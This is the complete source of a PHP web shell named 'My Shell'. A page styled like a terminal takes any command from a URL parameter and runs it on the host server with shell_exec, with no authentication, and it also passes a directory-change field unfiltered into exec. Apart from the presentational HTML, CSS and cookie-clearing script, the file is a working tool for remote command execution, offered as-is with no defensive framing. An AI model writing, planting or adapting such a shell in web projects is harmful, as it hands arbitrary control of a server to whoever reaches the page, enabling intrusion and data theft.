<?php
session_start();
if ($_SESSION['location'] === null) {
    $location = exec("pwd");
    $_SESSION['location'] = exec("pwd");
} else {
    $location = $_SESSION['location'];
}
if (!isset($_GET['cmd']) || $_GET['cmd'] == null) {
    $cmd = "whoami";
} else {
    $cmd = $_GET['cmd'];
}
if (isset($_GET['new-location']) && $_GET['new-location'] != null) {
    $_SESSION['location'] = exec("cd ". $_SESSION['location'] .";".$_GET['new-location'] . ";pwd;");
    print("<script>document.location = location.protocol + '//' + location.host + location.pathname</script>");
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Shell</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Mono&display=swap');

        body {
            background-color: #323232;
        }

        .terminal {
            width: 95%;
            height: 650px;
            background-color: white;
            /* border-radius: 3%; */
            text-align: left;
            background-color: black;
        }

        .terminal-input {
            width: 93%;
            height: 30px;
            /* border-radius: 10%; */
            padding-left: 1%;
            padding-right: 1%;
            background-color: black;
            color: white;
            border: none;
        }

        .bash {
            font-family: 'Noto Sans Mono', monospace;
            /* float: left; */
            position: relative;
            left: 20px;
            font-size: 14px;
            color: white;
        }

        location {
            color: #8ca882;
        }

        .button {
            background-color: #4CAF50;
            /* Green */
            border: none;
            color: white;
            padding: 8px 16px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            transition-duration: 0.4s;
            cursor: pointer;
        }

        .button1 {
            background-color: transparent;
            color: white;
            border: 2px solid #4CAF50;
        }

        .button1:hover {
            background-color: #4CAF50;
            color: white;
        }
    </style>
</head>

<body>
    <center>
        <button class="button button1" onclick="deleteAllCookies()">Clear</button><br><br>

        <div class="terminal">
            <br>

            <p class="bash">
                <location>$ <?= $location ?></location> <?= $cmd ?>
            </p>
            <pre style="color:white;position:relative;left:20px;"><?= shell_exec("cd " . $location . ";" . $cmd); ?></pre>

        </div>
        <form method="GET">
            <input name="cmd" class="terminal-input" placeholder="Enter command here."><br><br>
            <input style="background-color:yellowgreen;color:black;font-size: 11px;" name="new-location" class="terminal-input" placeholder="(optional to change default directory) | Example [ cd ../imgs/ ]">
            <br><br><button class="button button1" type="submit">Send</button>
        </form>

        <br>

        <script>
            function deleteAllCookies() {
                var cookies = document.cookie.split(";");

                for (var i = 0; i < cookies.length; i++) {
                    var cookie = cookies[i];
                    var eqPos = cookie.indexOf("=");
                    var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
                    document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
                    document.location = location.protocol + '//' + location.host + location.pathname
                    // location.reload();
                }
            }
        </script>
    </center>
</body>

</html>